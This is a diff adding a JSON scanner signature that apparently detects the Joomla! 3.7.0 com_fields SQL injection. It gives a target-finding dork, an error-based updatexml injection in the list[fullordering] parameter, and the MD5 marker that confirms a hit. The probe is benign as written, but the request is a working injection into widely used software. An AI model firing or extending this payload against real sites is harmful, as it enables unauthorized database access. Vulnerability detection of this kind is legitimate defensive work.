@@ -1,0 +1,17 @@
+{
+    "name": "Joomla!_3.7.0_Core_SQL_Injection",
+    "method": "GET",
+    "port": [
+        80
+    ],
+    "dork": "apps=Joomla",
+    "suffix": [
+        "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,(select md5(1))),1)"
+    ],
+    "hits": [
+        "c4ca4238a0b923820dcc509a6f75849b"
+    ],
+    "references": [
+        "https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html"
+    ]
+}
